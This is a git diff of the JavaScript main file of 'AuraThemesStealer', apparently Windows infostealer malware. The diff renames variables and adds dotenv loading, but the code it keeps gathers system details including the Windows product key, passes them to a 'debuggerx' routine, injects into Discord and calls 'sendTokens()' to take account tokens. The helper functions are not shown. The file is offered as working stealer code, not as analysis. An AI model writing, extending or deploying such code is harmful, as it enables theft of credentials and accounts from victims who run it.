@@ -1,5 +1,7 @@
 const process = require("process");
-const getconfig = require("./config/config")();
+const GET_CONFIG = require("./config/config")();
+
+require("dotenv").config();
 
 switch (process.platform) {
     case "win32":
@@ -15,21 +17,17 @@ switch (process.platform) {
             }
             async aurita() {
                 try {
-                    const { disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion } = await getInfo();
-                    
-                    await debuggerx(getconfig.debugger, disk, ram, uid, cpucount, ip, os, cpu, gpu, windowskey, windowsversion);
-                    await discordInjected(getconfig.injection);
+                    const { DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION } = await getInfo();
+                    await debuggerx(GET_CONFIG.debugger, DISK, RAM, UID, CPU_COUNT, IP, OS, CPU, GPU, WINDOWS_KEY, WINDOWS_VERSION);
+                    await discordInjected(GET_CONFIG.injection);
                     await sendTokens();
-
                     error();
                 } catch (error) {
                     return console.error('An error occurred in main', error);
                 }
             }
         }
-
         new AuraThemesStealer()
-
         break;
     default:
         break;
